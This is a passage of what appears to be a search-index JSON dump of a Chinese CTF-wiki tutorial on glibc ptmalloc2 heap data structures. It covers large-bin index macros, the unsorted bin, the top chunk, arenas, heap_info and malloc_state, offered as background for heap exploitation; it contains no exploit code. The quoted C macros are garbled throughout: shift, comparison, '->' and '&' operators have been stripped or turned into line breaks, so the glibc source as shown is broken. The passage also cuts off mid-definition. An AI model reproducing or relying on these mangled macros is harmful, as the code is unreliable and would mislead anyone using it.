(((unsigned long) (sz)) \n 18)        \\\n\n\n                                 : 126)\n\n\n\n#define largebin_index_32_big(sz)                                              \\\n\n\n    (((((unsigned long) (sz)) \n 6) \n= 45)                                     \\\n\n\n         ? 49 + (((unsigned long) (sz)) \n 6)                                  \\\n\n\n         : ((((unsigned long) (sz)) \n 9) \n= 20)                               \\\n\n\n               ? 91 + (((unsigned long) (sz)) \n 9)                            \\\n\n\n               : ((((unsigned long) (sz)) \n 12) \n= 10)                        \\\n\n\n                     ? 110 + (((unsigned long) (sz)) \n 12)                    \\\n\n\n                     : ((((unsigned long) (sz)) \n 15) \n= 4)                   \\\n\n\n                           ? 119 + (((unsigned long) (sz)) \n 15)              \\\n\n\n                           : ((((unsigned long) (sz)) \n 18) \n= 2)             \\\n\n\n                                 ? 124 + (((unsigned long) (sz)) \n 18)        \\\n\n\n                                 : 126)\n\n\n\n// XXX It remains to be seen whether it is good to keep the widths of\n\n\n// XXX the buckets the same or whether it should be scaled by a factor\n\n\n// XXX of two as well.\n\n\n#define largebin_index_64(sz)                                                  \\\n\n\n    (((((unsigned long) (sz)) \n 6) \n= 48)                                     \\\n\n\n         ? 48 + (((unsigned long) (sz)) \n 6)                                  \\\n\n\n         : ((((unsigned long) (sz)) \n 9) \n= 20)                               \\\n\n\n               ? 91 + (((unsigned long) (sz)) \n 9)                            \\\n\n\n               : ((((unsigned long) (sz)) \n 12) \n= 10)                        \\\n\n\n                     ? 110 + (((unsigned long) (sz)) \n 12)                    \\\n\n\n                     : ((((unsigned long) (sz)) \n 15) \n= 4)                   \\\n\n\n                           ? 119 + (((unsigned long) (sz)) \n 15)              \\\n\n\n                           : ((((unsigned long) (sz)) \n 18) \n= 2)             \\\n\n\n                                 ? 124 + (((unsigned long) (sz)) \n 18)        \\\n\n\n                                 : 126)\n\n\n\n#define largebin_index(sz)                                                     \\\n\n\n    (SIZE_SZ == 8 ? largebin_index_64(sz) : MALLOC_ALIGNMENT == 16             \\\n\n\n                                                ? largebin_index_32_big(sz)    \\\n\n\n                                                : largebin_index_32(sz))\n\n\n\n\n\nunsorted bin\n\n\nunsorted bin \u53ef\u4ee5\u89c6\u4e3a\u7a7a\u95f2 chunk \u56de\u5f52\u5176\u6240\u5c5e bin \u4e4b\u524d\u7684\u7f13\u51b2\u533a\u3002\n\n\n\u5176\u5728 glibc \u4e2d\u5177\u4f53\u7684\u8bf4\u660e\u5982\u4e0b\n\n\n/*\n\n\n   Unsorted chunks\n\n\n\n    All remainders from chunk splits, as well as all returned chunks,\n\n\n    are first placed in the \nunsorted\n bin. They are then placed\n\n\n    in regular bins after malloc gives them ONE chance to be used before\n\n\n    binning. So, basically, the unsorted_chunks list acts as a queue,\n\n\n    with chunks being placed on it in free (and malloc_consolidate),\n\n\n    and taken off (to be either used or placed in bins) in malloc.\n\n\n\n    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it\n\n\n    does not have to be taken into account in size comparisons.\n\n\n */\n\n\n\n\n\n\u4ece\u4e0b\u9762\u7684\u5b8f\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\n\n\n/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */\n\n\n#define unsorted_chunks(M) (bin_at(M, 1))\n\n\n\n\n\nunsorted bin \u5904\u4e8e\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\u7684bin\u6570\u7ec4\u4e0b\u68071\u5904\u3002\u6545\u800c unsorted bin\u53ea\u6709\u4e00\u4e2a\u94fe\u8868\u3002unsorted bin \u4e2d\u7684\u7a7a\u95f2 chunk \u5904\u4e8e\u4e71\u5e8f\u72b6\u6001\uff0c\u4e3b\u8981\u6709\u4e24\u4e2a\u6765\u6e90\n\n\n\n\n\u5f53\u4e00\u4e2a\u8f83\u5927\u7684 chunk \u88ab\u5206\u5272\u6210\u4e24\u534a\u540e\uff0c\u5982\u679c\u5269\u4e0b\u7684\u90e8\u5206\u5927\u4e8eMINSIZE\uff0c\u5c31\u4f1a\u88ab\u653e\u5230 unsorted bin \u4e2d\u3002\n\n\n\u91ca\u653e\u4e00\u4e2a\u4e0d\u5c5e\u4e8e fast bin \u7684 chunk\uff0c\u5e76\u4e14\u8be5 chunk \u4e0d\u548c top chunk \u7d27\u90bb\u65f6\uff0c\u8be5 chunk \u4f1a\u88ab\u9996\u5148\u653e\u5230 unsorted bin \u4e2d\u3002\u5173\u4e8e top chunk \u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u8003\u4e0b\u9762\u7684\u4ecb\u7ecd\u3002\n\n\n\n\n\u6b64\u5916\uff0cUnsorted Bin \u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u91c7\u7528\u7684\u904d\u5386\u987a\u5e8f\u662f FIFO \u3002\n\n\ncommon macro\n\n\n\u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e9b\u901a\u7528\u7684\u5b8f\u3002\n\n\n\u6839\u636echunk\u7684\u5927\u5c0f\u7edf\u4e00\u5730\u83b7\u5f97chunk\u6240\u5728\u7684\u7d22\u5f15\n\n\n#define bin_index(sz)                                                          \\\n\n\n    ((in_smallbin_range(sz)) ? smallbin_index(sz) : largebin_index(sz))\n\n\n\n\n\ntop chunk\n\n\nglibc \u4e2d\u5bf9\u4e8e top chunk \u7684\u63cf\u8ff0\u5982\u4e0b\n\n\n/*\n\n\n   Top\n\n\n\n    The top-most available chunk (i.e., the one bordering the end of\n\n\n    available memory) is treated specially. It is never included in\n\n\n    any bin, is used only if no other chunk is available, and is\n\n\n    released back to the system if it is very large (see\n\n\n    M_TRIM_THRESHOLD).  Because top initially\n\n\n    points to its own bin with initial zero size, thus forcing\n\n\n    extension on the first malloc request, we avoid having any special\n\n\n    code in malloc to check whether it even exists yet. But we still\n\n\n    need to do so when getting memory from system, so we make\n\n\n    initial_top treat the bin as a legal but unusable chunk during the\n\n\n    interval between initialization and the first call to\n\n\n    sysmalloc. (This is somewhat delicate, since it relies on\n\n\n    the 2 preceding words to be zero during this interval as well.)\n\n\n */\n\n\n\n/* Conveniently, the unsorted bin can be used as dummy top on first call */\n\n\n#define initial_top(M) (unsorted_chunks(M))\n\n\n\n\n\n\u7a0b\u5e8f\u7b2c\u4e00\u6b21\u8fdb\u884c malloc \u7684\u65f6\u5019\uff0cheap \u4f1a\u88ab\u5206\u4e3a\u4e24\u5757\uff0c\u4e00\u5757\u7ed9\u7528\u6237\uff0c\u5269\u4e0b\u7684\u90a3\u5757\u5c31\u662f top chunk\u3002\u5176\u5b9e\uff0c\u6240\u8c13\u7684top chunk \u5c31\u662f\u5904\u4e8e\u5f53\u524d\u5806\u7684\u7269\u7406\u5730\u5740\u6700\u9ad8\u7684 chunk\u3002\u8fd9\u4e2a chunk \u4e0d\u5c5e\u4e8e\u4efb\u4f55\u4e00\u4e2a bin\uff0c\u5b83\u7684\u4f5c\u7528\u5728\u4e8e\u5f53\u6240\u6709\u7684bin \u90fd\u65e0\u6cd5\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\u65f6\uff0c\u5982\u679c\u5176\u5927\u5c0f\u4e0d\u5c0f\u4e8e\u6307\u5b9a\u7684\u5927\u5c0f\uff0c\u5c31\u8fdb\u884c\u5206\u914d\uff0c\u5e76\u5c06\u5269\u4e0b\u7684\u90e8\u5206\u4f5c\u4e3a\u65b0\u7684 top chunk\u3002\u5426\u5219\uff0c\u5c31\u5bf9heap\u8fdb\u884c\u6269\u5c55\u540e\u518d\u8fdb\u884c\u5206\u914d\u3002\u5728main arena\u4e2d\u901a\u8fc7sbrk\u6269\u5c55heap\uff0c\u800c\u5728thread arena\u4e2d\u901a\u8fc7mmap\u5206\u914d\u65b0\u7684heap\u3002\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0ctop chunk \u7684 prev_inuse \u6bd4\u7279\u4f4d\u59cb\u7ec8\u4e3a1\uff0c\u5426\u5219\u5176\u524d\u9762\u7684chunk\u5c31\u4f1a\u88ab\u5408\u5e76\u5230top chunk\u4e2d\u3002\n\n\n\u521d\u59cb\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06 unsorted chunk \u4f5c\u4e3a top chunk\u3002\n\n\nlast remainder\n\n\n\u5728\u7528\u6237\u4f7f\u7528 malloc \u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0cptmalloc2 \u627e\u5230\u7684 chunk \u53ef\u80fd\u5e76\u4e0d\u548c\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e00\u81f4\uff0c\u8fd9\u65f6\u5019\u5c31\u5c06\u5206\u5272\u4e4b\u540e\u7684\u5269\u4f59\u90e8\u5206\u79f0\u4e4b\u4e3a last remainder chunk \uff0cunsort bin\u4e5f\u4f1a\u5b58\u8fd9\u4e00\u5757\u3002top chunk \u5206\u5272\u5269\u4e0b\u7684\u90e8\u5206\u4e0d\u4f1a\u4f5c\u4e3alast remainer.\n\n\n\u5b8f\u89c2\u7ed3\u6784\n\n\narena\n\n\n\u5728\u6211\u4eec\u4e4b\u524d\u4ecb\u7ecd\u7684\u4f8b\u5b50\u4e2d\uff0c\u65e0\u8bba\u662f\u4e3b\u7ebf\u7a0b\u8fd8\u662f\u65b0\u521b\u5efa\u7684\u7ebf\u7a0b\uff0c\u5728\u7b2c\u4e00\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u90fd\u4f1a\u6709\u72ec\u7acb\u7684arena\u3002\u90a3\u4e48\u4f1a\u4e0d\u4f1a\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u6709\u72ec\u7acb\u7684arena\u5462\uff1f\u4e0b\u9762\u6211\u4eec\u5c31\u5177\u4f53\u4ecb\u7ecd\u3002\n\n\narena \u6570\u91cf\n\n\n\u5bf9\u4e8e\u4e0d\u540c\u7cfb\u7edf\uff0carena\u6570\u91cf\u7684\n\u7ea6\u675f\n\u5982\u4e0b\n\n\nFor 32 bit systems:\n     Number of arena = 2 * number of cores.\nFor 64 bit systems:\n     Number of arena = 8 * number of cores.\n\n\n\n\n\u663e\u7136\uff0c\u4e0d\u662f\u6bcf\u4e00\u4e2a\u7ebf\u7a0b\u90fd\u4f1a\u6709\u5bf9\u5e94\u7684 arena\u3002\u81f3\u4e8e\u4e3a\u4ec0\u4e4864\u4f4d\u7cfb\u7edf\uff0c\u8981\u90a3\u4e48\u8bbe\u7f6e\uff0c\u6211\u4e5f\u6ca1\u6709\u60f3\u660e\u767d\u3002\u6b64\u5916\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u7cfb\u7edf\u7684\u6838\u6570\u662f\u6709\u9650\u7684\uff0c\u5f53\u7ebf\u7a0b\u6570\u5927\u4e8e\u6838\u6570\u7684\u4e8c\u500d\uff08\u8d85\u7ebf\u7a0b\u6280\u672f\uff09\u65f6\uff0c\u5c31\u5fc5\u7136\u6709\u7ebf\u7a0b\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\uff0c\u6240\u4ee5\u6ca1\u6709\u5fc5\u8981\u4e3a\u6bcf\u4e2a\u7ebf\u7a0b\u5206\u914d\u4e00\u4e2a arena\u3002\n\n\narena \u5206\u914d\u89c4\u5219\n\n\n\u5f85\u8865\u5145\u3002\n\n\n\u533a\u522b\n\n\n\u4e0e thread \u4e0d\u540c\u7684\u662f\uff0cmain_arena \u5e76\u4e0d\u5728\u7533\u8bf7\u7684 heap \u4e2d\uff0c\u800c\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5728 libc.so \u7684\u6570\u636e\u6bb5\u3002\n\n\nheap_info\n\n\n\u7a0b\u5e8f\u521a\u5f00\u59cb\u6267\u884c\u65f6\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u662f\u6ca1\u6709 heap \u533a\u57df\u7684\u3002\u5f53\u5176\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u5c31\u9700\u8981\u4e00\u4e2a\u7ed3\u6784\u6765\u8bb0\u5f55\u5bf9\u5e94\u7684\u4fe1\u606f\uff0c\u800cheap_info \u7684\u4f5c\u7528\u5c31\u662f\u8fd9\u4e2a\u3002\u800c\u4e14\u5f53\u8be5heap\u7684\u8d44\u6e90\u88ab\u4f7f\u7528\u5b8c\u540e\uff0c\u5c31\u5fc5\u987b\u5f97\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u4e86\u3002\u6b64\u5916\uff0c\u4e00\u822c\u7533\u8bf7\u7684heap \u662f\u4e0d\u8fde\u7eed\u7684\uff0c\u56e0\u6b64\u9700\u8981\u8bb0\u5f55\u4e0d\u540cheap\u4e4b\u95f4\u7684\u94fe\u63a5\u7ed3\u6784\u3002\n\n\n\u8be5\u6570\u636e\u7ed3\u6784\u662f\u4e13\u95e8\u4e3a\u4ece Memory Mapping Segment \u5904\u7533\u8bf7\u7684\u5185\u5b58\u51c6\u5907\u7684\uff0c\u5373\u4e3a\u975e\u4e3b\u7ebf\u7a0b\u51c6\u5907\u7684\u3002\n\n\n\u4e3b\u7ebf\u7a0b\u53ef\u4ee5\u901a\u8fc7 sbrk() \u51fd\u6570\u6269\u5c55 program break location \u83b7\u5f97\uff08\u76f4\u5230\u89e6\u53caMemory Mapping Segment\uff09\uff0c\u53ea\u6709\u4e00\u4e2aheap\uff0c\u6ca1\u6709 heap_info \u6570\u636e\u7ed3\u6784\u3002\n\n\nheap_info \u7684\u4e3b\u8981\u7ed3\u6784\u5982\u4e0b\n\n\n#define HEAP_MIN_SIZE (32 * 1024)\n\n\n#ifndef HEAP_MAX_SIZE\n\n\n# ifdef DEFAULT_MMAP_THRESHOLD_MAX\n\n\n#  define HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX)\n\n\n# else\n\n\n#  define HEAP_MAX_SIZE (1024 * 1024) \n/* must be a power of two */\n\n\n# endif\n\n\n#endif\n\n\n\n/* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps\n\n\n   that are dynamically created for multi-threaded programs.  The\n\n\n   maximum size must be a power of two, for fast determination of\n\n\n   which heap belongs to a chunk.  It should be much larger than the\n\n\n   mmap threshold, so that requests with a size just below that\n\n\n   threshold can be fulfilled without creating too many heaps.  */\n\n\n\n/***************************************************************************/\n\n\n\n/* A heap is a single contiguous memory region holding (coalesceable)\n\n\n   malloc_chunks.  It is allocated with mmap() and always starts at an\n\n\n   address aligned to HEAP_MAX_SIZE.  */\n\n\n\ntypedef\n \nstruct\n \n_heap_info\n\n\n{\n\n  \nmstate\n \nar_ptr\n;\n \n/* Arena for this heap. */\n\n  \nstruct\n \n_heap_info\n \n*\nprev\n;\n \n/* Previous heap. */\n\n  \nsize_t\n \nsize\n;\n   \n/* Current size in bytes. */\n\n  \nsize_t\n \nmprotect_size\n;\n \n/* Size in bytes that has been mprotected\n\n\n                           PROT_READ|PROT_WRITE.  */\n\n  \n/* Make sure the following data is properly aligned, particularly\n\n\n     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of\n\n\n     MALLOC_ALIGNMENT. */\n\n  \nchar\n \npad\n[\n-\n6\n \n*\n \nSIZE_SZ\n \n \nMALLOC_ALIGN_MASK\n];\n\n\n}\n \nheap_info\n;\n\n\n\n\n\n\u8be5\u7ed3\u6784\u4e3b\u8981\u662f\u63cf\u8ff0\u5806\u7684\u57fa\u672c\u4fe1\u606f\uff0c\u5305\u62ec\n\n\n\n\n\u5806\u5bf9\u5e94\u7684 arena \u7684\u5730\u5740\n\n\n\u7531\u4e8e\u4e00\u4e2a\u7ebf\u7a0b\u7533\u8bf7\u4e00\u4e2a\u5806\u4e4b\u540e\uff0c\u53ef\u80fd\u4f1a\u4f7f\u7528\u5b8c\uff0c\u4e4b\u540e\u5c31\u5fc5\u987b\u5f97\u518d\u6b21\u7533\u8bf7\u3002\u56e0\u6b64\uff0c\u4e00\u4e2a\u53ef\u80fd\u4f1a\u6709\u591a\u4e2a\u5806\u3002prev\u5373\u8bb0\u5f55\u4e86\u4e0a\u4e00\u4e2a heap_info \u7684\u5730\u5740\u3002\u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u6bcf\u4e2a\u5806\u7684 heap_info \u662f\u901a\u8fc7\u5355\u5411\u94fe\u8868\u8fdb\u884c\u94fe\u63a5\u7684\u3002\n\n\nsize \u8868\u793a\u5f53\u524d\u5806\u7684\u5927\u5c0f\n\n\n\u6700\u540e\u4e00\u90e8\u5206\u786e\u4fdd\u5bf9\u9f50\uff08\n\u8fd9\u91cc\u8d1f\u6570\u4f7f\u7528\u7684\u7f18\u7531\u662f\u4ec0\u4e48\u5462\n\uff1f\uff09\n\n\n\n\n\u770b\u8d77\u6765\u8be5\u7ed3\u6784\u5e94\u8be5\u662f\u76f8\u5f53\u91cd\u8981\u7684\uff0c\u4f46\u662f\u5982\u679c\u5982\u679c\u6211\u4eec\u4ed4\u7ec6\u770b\u5b8c\u6574\u4e2a malloc \u7684\u5b9e\u73b0\u7684\u8bdd\uff0c\u5c31\u4f1a\u53d1\u73b0\u5b83\u51fa\u73b0\u7684\u9891\u7387\u5e76\u4e0d\u9ad8\u3002\n\n\nmalloc_state\n\n\n\u8be5\u7ed3\u6784\u7528\u4e8e\u7ba1\u7406\u5806\uff0c\u8bb0\u5f55\u6bcf\u4e2a arena \u5f53\u524d\u7533\u8bf7\u7684\u5185\u5b58\u7684\u5177\u4f53\u72b6\u6001\uff0c\u6bd4\u5982\u8bf4\u662f\u5426\u6709\u7a7a\u95f2chunk\uff0c\u6709\u4ec0\u4e48\u5927\u5c0f\u7684\u7a7a\u95f2chunk \u7b49\u7b49\u3002\u65e0\u8bba\u662f thread arena \u8fd8\u662f main arena\uff0c\u5b83\u4eec\u90fd\u53ea\u6709\u4e00\u4e2a malloc state \u7ed3\u6784\u3002\u7531\u4e8e thread \u7684 arena \u53ef\u80fd\u6709\u591a\u4e2a\uff0cmalloc state\u7ed3\u6784\u4f1a\u5728\u6700\u65b0\u7533\u8bf7\u7684arena\u4e2d\u3002\n\n\n\u6ce8\u610f\uff0cmain arena \u7684 malloc_state \u5e76\u4e0d\u662f heap segment \u7684\u4e00\u90e8\u5206\uff0c\u800c\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5b58\u50a8\u5728 libc.so \u7684\u6570\u636e\u6bb5\u3002\n\n\n\u5176\u7ed3\u6784\u5982\u4e0b\n\n\nstruct\n \nmalloc_state\n \n{\n\n    \n/* Serialize access.  */\n\n    \n__libc_lock_define\n(,\n \nmutex\n);\n\n\n    \n/* Flags (formerly in max_fast).  */\n\n    \nint\n \nflags\n;\n\n\n    \n/* Fastbins */\n\n    \nmfastbinptr\n \nfastbinsY\n[\n \nNFASTBINS\n \n];\n\n\n    \n/* Base of the topmost chunk -- not otherwise kept in a bin */\n\n    \nmchunkptr\n \ntop\n;\n\n\n    \n/* The remainder from the most recent split of a small request */\n\n    \nmchunkptr\n \nlast_remainder\n;\n\n\n    \n/* Normal bins packed as described above */\n\n    \nmchunkptr\n \nbins\n[\n \nNBINS\n \n*\n \n2\n \n-\n \n2\n \n];\n\n\n    \n/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/\n\n    \nunsigned\n \nint\n \nbinmap\n[\n \nBINMAPSIZE\n \n];\n\n\n    \n/* Linked list, points to the next arena */\n\n    \nstruct\n \nmalloc_state\n \n*\nnext\n;\n\n\n    \n/* Linked list for free arenas.  Access to this field is serialized\n\n\n       by free_list_lock in arena.c.  */\n\n    \nstruct\n \nmalloc_state\n \n*\nnext_free\n;\n\n\n    \n/* Number of threads attached to this arena.  0 if the arena is on\n\n\n       the free list.  Access to this field is serialized by\n\n\n       free_list_lock in arena.c.  */\n\n    \nINTERNAL_SIZE_T\n \nattached_threads\n;\n\n\n    \n/* Memory allocated from the system in this arena.  */\n\n    \nINTERNAL_SIZE_T\n \nsystem_mem\n;\n\n    \nINTERNAL_SIZE_T\n \nmax_system_mem\n;\n\n\n};\n\n\n\n\n\n\n\n\n\n__libc_lock_define(, mutex);\n\n\n\n\n\u8be5\u53d8\u91cf\u7528\u4e8e\u63a7\u5236\u7a0b\u5e8f\u4e32\u884c\u8bbf\u95ee\u540c\u4e00\u4e2a\u5206\u914d\u533a\uff0c\u5f53\u4e00\u4e2a\u7ebf\u7a0b\u83b7\u53d6\u4e86\u5206\u914d\u533a\u4e4b\u540e\uff0c\u5176\u5b83\u7ebf\u7a0b\u8981\u60f3\u8bbf\u95ee\u8be5\u5206\u914d\u533a\uff0c\u5c31\u5fc5\u987b\u7b49\u5f85\u8be5\u7ebf\u7a0b\u5206\u914d\u5b8c\u6210\u5019\u624d\u80fd\u591f\u4f7f\u7528\u3002\n\n\n\n\n\n\n\n\nflags\n\n\n\n\nflags\u8bb0\u5f55\u4e86\u5206\u914d\u533a\u7684\u4e00\u4e9b\u6807\u5fd7\uff0c\u6bd4\u5982 bit0 \u8bb0\u5f55\u4e86\u5206\u914d\u533a\u662f\u5426\u6709 fast bin chunk \uff0cbit1 \u6807\u8bc6\u5206\u914d\u533a\u662f\u5426\u80fd\u8fd4\u56de\u8fde\u7eed\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002\u5177\u4f53\u5982\u4e0b\n\n\n\n\n\n\n\n\n/*\n\n\n   FASTCHUNKS_BIT held in max_fast indicates that there are probably\n\n\n   some fastbin chunks. It is set true on entering a chunk into any\n\n\n   fastbin, and cleared only in malloc_consolidate.\n\n\n   The truth value is inverted so that have_fastchunks will be true\n\n\n   upon startup (since statics are zero-filled), simplifying\n\n\n   initialization checks.\n\n\n */\n\n\n\n#define FASTCHUNKS_BIT (1U)\n\n\n\n#define have_fastchunks(M) (((M)-\nflags \n FASTCHUNKS_BIT) == 0)\n\n\n#define clear_fastchunks(M) catomic_or(\n(M)-\nflags, FASTCHUNKS_BIT)\n\n\n#define set_fastchunks(M) catomic_and(\n(M)-\nflags, ~FASTCHUNKS_BIT)\n\n\n\n/*\n\n\n   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous\n\n\n   regions.  Otherwise, contiguity is exploited in merging together,\n\n\n   when possible, results from consecutive MORECORE calls.\n\n\n   The initial value comes from MORECORE_CONTIGUOUS, but is\n\n\n   changed dynamically if mmap is ever used as an sbrk substitute.\n\n\n */\n\n\n\n#define NONCONTIGUOUS_BIT (2U)\n\n\n\n#define contiguous(M) (((M)-\nflags \n NONCONTIGUOUS_BIT) == 0)\n\n\n#define noncontiguous(M) (((M)-\nflags \n NONCONTIGUOUS_BIT) != 0)\n\n\n#define set_noncontiguous(M) ((M)-\nflags |= NONCONTIGUOUS_BIT)\n\n\n#define set_contiguous(M) ((M)-\nflags \n= ~NONCONTIGUOUS_BIT)\n\n\n\n/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the\n\n\n   arena.  Such an arena is no longer used to allocate chunks.  Chunks\n\n\n   allocated in that arena before detecting corruption are not freed.  */\n\n\n\n#define ARENA_CORRUPTION_BIT (4U)\n\n\n\n#define arena_is_corrupt(A) (((A)-\nflags \n ARENA_CORRUPTION_BIT))\n\n\n#define set_arena_corrupt(A) ((A)-\nflags |= ARENA_CORRUPTION_BIT)\n\n\n\n\n\n\n\nfastbinsY[NFASTBINS]\n\n\n\u5b58\u653e\u6bcf\u4e2a fast chunk \u94fe\u8868\u5934\u90e8\u7684\u6307\u9488\n\n\n\n\n\n\ntop\n\n\n\u6307\u5411\u5206\u914d\u533a\u7684 top chunk\n\n\n\n\n\n\nlast_reminder\n\n\n\u6700\u65b0\u7684 chunk \u5206\u5272\u4e4b\u540e\u5269\u4e0b\u7684\u90a3\u90e8\u5206\n\n\n\n\n\n\nbins\n\n\n\u7528\u4e8e\u5b58\u50a8 unstored bin\uff0csmall bins \u548c large bins \u7684 chunk \u94fe\u8868\u3002\n\n\n\n\n\n\nbinmap\n\n\nptmalloc \u7528\u4e00\u4e2a bit \u6765\u6807\u8bc6\u67d0\u4e00\u4e2a bin \u4e2d\u662f\u5426\u5305\u542b\u7a7a\u95f2 chunk \u3002\n\n\n\n\n\n\n\n\nmalloc_par\n\n\n\uff01\uff01\u5f85\u8865\u5145\uff01\uff01", 
            "title": "\u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#_1", 
            "text": "\u5806\u7684\u64cd\u4f5c\u5c31\u8fd9\u4e48\u590d\u6742\uff0c\u90a3\u4e48\u5728 glibc \u5185\u90e8\u5fc5\u7136\u4e5f\u6709\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u6570\u636e\u7ed3\u6784\u6765\u7ba1\u7406\u5b83\u3002\u4e0e\u5806\u76f8\u5e94\u7684\u6570\u636e\u7ed3\u6784\u4e3b\u8981\u5206\u4e3a   \u5b8f\u89c2\u7ed3\u6784\uff0c\u5305\u542b\u5806\u7684\u5b8f\u89c2\u4fe1\u606f\uff0c\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u7d22\u5f15\u5806\u7684\u57fa\u672c\u4fe1\u606f\u3002  \u5fae\u89c2\u7ed3\u6784\uff0c\u7528\u4e8e\u5177\u4f53\u5904\u7406\u5806\u7684\u5206\u914d\u4e0e\u56de\u6536\u4e2d\u7684\u5185\u5b58\u5757\u3002", 
            "title": "\u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#overview", 
            "text": "\u8fd9\u91cc\u7ed9\u4e00\u4e2a\u5b8f\u89c2\u7684\u56fe\u7247\u3002", 
            "title": "Overview\uff1f\uff1f\uff1f\uff1f"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#_2", 
            "text": "\u8fd9\u91cc\u9996\u5148\u4ecb\u7ecd\u5806\u4e2d\u6bd4\u8f83\u7ec6\u8282\u7684\u7ed3\u6784\uff0c \u5806\u7684\u6f0f\u6d1e\u5229\u7528\u4e0e\u8fd9\u4e9b\u7ed3\u6784\u5bc6\u5207\u76f8\u5173 \u3002", 
            "title": "\u5fae\u89c2\u7ed3\u6784"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#malloc_chunk", 
            "text": "", 
            "title": "malloc_chunk"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#_3", 
            "text": "\u5728\u7a0b\u5e8f\u7684\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u79f0\u7531 malloc \u7533\u8bf7\u7684\u5185\u5b58\u4e3a chunk \u3002\u8fd9\u5757\u5185\u5b58\u5728 ptmalloc \u5185\u90e8\u7528 malloc_chunk \u7ed3\u6784\u4f53\u6765\u8868\u793a\u3002\u5f53\u7a0b\u5e8f\u7533\u8bf7\u7684 chunk \u88ab free \u540e\uff0c\u4f1a\u88ab\u52a0\u5165\u5230\u76f8\u5e94\u7684\u7a7a\u95f2\u7ba1\u7406\u5217\u8868\u4e2d\u3002  \u975e\u5e38\u6709\u610f\u601d\u7684\u662f\uff0c \u65e0\u8bba\u4e00\u4e2a chunk \u7684\u5927\u5c0f\u5982\u4f55\uff0c\u5904\u4e8e\u5206\u914d\u72b6\u6001\u8fd8\u662f\u91ca\u653e\u72b6\u6001\uff0c\u5b83\u4eec\u90fd\u4f7f\u7528\u4e00\u4e2a\u7edf\u4e00\u7684\u7ed3\u6784 \u3002\u867d\u7136\u5b83\u4eec\u4f7f\u7528\u4e86\u540c\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u662f\u6839\u636e\u662f\u5426\u88ab\u91ca\u653e\uff0c\u5b83\u4eec\u7684\u8868\u73b0\u5f62\u5f0f\u4f1a\u6709\u6240\u4e0d\u540c\u3002  malloc_chunk \u7684\u7ed3\u6784\u5982\u4e0b  /*    This struct declaration is misleading (but accurate and necessary).    It declares a  view  into memory allowing access to necessary    fields at known offsets from a given base. See explanation below.  */  struct   malloc_chunk   { \n\n   INTERNAL_SIZE_T        prev_size ;    /* Size of previous chunk (if free).  */ \n   INTERNAL_SIZE_T        size ;         /* Size in bytes, including overhead. */ \n\n   struct   malloc_chunk *   fd ;           /* double links -- used only if free. */ \n   struct   malloc_chunk *   bk ; \n\n   /* Only used for large blocks: pointer to next larger size.  */ \n   struct   malloc_chunk *   fd_nextsize ;   /* double links -- used only if free. */ \n   struct   malloc_chunk *   bk_nextsize ;  };   \u9996\u5148\uff0c\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e9b\u5fc5\u8981\u7684\u89e3\u91ca INTERNAL_SIZE_T\uff0cSIZE_SZ\uff0cMALLOC_ALIGN_MASK\uff1a  /* INTERNAL_SIZE_T is the word-size used for internal bookkeeping of     chunk sizes.     The default version is the same as size_t.     While not strictly necessary, it is best to define this as an     unsigned type, even if size_t is a signed type. This may avoid some     artificial size limitations on some systems.     On a 64-bit machine, you may be able to reduce malloc overhead by     defining INTERNAL_SIZE_T to be a 32 bit `unsigned int  at the     expense of not being able to handle more than 2^32 of malloced     space. If this limitation is acceptable, you are encouraged to set     this unless you are on a platform requiring 16byte alignments. In     this case the alignment requirements turn out to negate any     potential advantages of decreasing size_t word size.     Implementors: Beware of the possible combinations of:       - INTERNAL_SIZE_T might be signed or unsigned, might be 32 or 64 bits,         and might be the same width as int or as long       - size_t might have different width and signedness as INTERNAL_SIZE_T       - int and long might be 32 or 64 bits, and might be the same width     To deal with this, most comparisons and difference computations     among INTERNAL_SIZE_Ts should cast them to unsigned long, being     aware of the fact that casting an unsigned int to a wider long does     not sign-extend. (This also makes checking for negative numbers     awkward.) Some of these casts result in harmless compiler warnings     on some systems.  */  #ifndef INTERNAL_SIZE_T  # define INTERNAL_SIZE_T size_t  #endif  /* The corresponding word size.  */  #define SIZE_SZ (sizeof 